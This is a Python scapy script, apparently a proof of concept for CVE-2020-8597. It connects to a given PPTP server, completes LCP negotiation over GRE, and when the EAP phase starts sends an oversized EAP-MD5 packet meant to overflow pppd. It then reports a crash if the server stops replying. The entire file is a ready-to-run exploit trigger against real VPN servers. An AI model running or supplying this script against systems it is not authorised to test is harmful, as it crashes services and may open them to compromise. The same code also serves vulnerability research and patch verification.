#!/usr/bin/env python3
from scapy.all import *
import socket, sys, time, random

if len(sys.argv) < 2:
    print("Usage: %s <pptpd_server_ip>" % sys.argv[0])
    sys.exit(1)

dst = sys.argv[1]
dport = 1723

print("Initiating communications with PPTP server %s" % dst)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((dst, dport))
cstream = StreamSocket(client)

call_id = random.randint(1000, 10000)
vr = PPTPStartControlConnectionRequest(vendor_string="cananian")
cstream.sr1(vr, verbose=False)
call_reply = cstream.sr1(PPTPOutgoingCallRequest(call_id=call_id), verbose=False)
call_id = format(raw(call_reply[0])[12], '02x') + format(raw(call_reply[0])[13], '02x')
call_id = int(call_id, 16)
print("call_id: 0x%s" % format(call_id, '04x'))

gre_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
gre_socket.connect((dst, dport))
gre_stream = SimpleSocket(gre_socket)

seq = [0]
def send_lcp(code, id_, options=None):
    seq[0] += 1
    pkt = GRE_PPTP(seqnum_present=1, call_id=call_id, seqence_number=seq[0])/HDLC()/PPP()/PPP_LCP_Configure(code=code, id=id_, options=options or [])
    gre_stream.send(pkt)

send_lcp(1, 1, [PPP_LCP_Magic_Number_Option(magic_number=0xaabbccdd)])

eap_seen = False
gre_socket.settimeout(2)
deadline = time.time() + 15

print("Waiting for LCP negotiation to complete and EAP phase to start...")
while time.time() < deadline and not eap_seen:
    try:
        data = gre_socket.recv(4096)
    except socket.timeout:
        continue
    try:
        pkt = IP(data)
    except Exception:
        continue
    if not pkt.haslayer(GRE_PPTP):
        continue
    if pkt.haslayer(PPP_LCP_Configure):
        lcp = pkt.getlayer(PPP_LCP_Configure)
        if lcp.code == 1:
            print("  got server Configure-Request, sending Ack")
            send_lcp(2, lcp.id, lcp.options)
    if pkt.haslayer(EAP):
        eap = pkt.getlayer(EAP)
        if eap.code == 1:
            print("  got EAP Request from server - ready to send payload")
            eap_seen = True

if not eap_seen:
    print("Never reached EAP phase, aborting")
    sys.exit(1)

print("Sending oversized EAP-MD5 packet (CVE-2020-8597 trigger)...")
seq[0] += 1
bad_pkt = GRE_PPTP(seqnum_present=1, call_id=call_id, seqence_number=seq[0])/PPP(proto=0xc227)/EAP_MD5(code=1, value_size=16, value=b'A'*16, optional_name=b'A'*1100)
gre_stream.send(bad_pkt)

print("Payload sent. Checking if server still responds...")
time.sleep(2)
gre_socket.settimeout(3)
got_reply = False
try:
    data = gre_socket.recv(4096)
    got_reply = True
    print("Server still replied - possibly NOT vulnerable, or reply unrelated")
except socket.timeout:
    print("No reply from server after payload - consistent with a crash (likely vulnerable)")

print("Done. Now check pppd process status on the server side.")
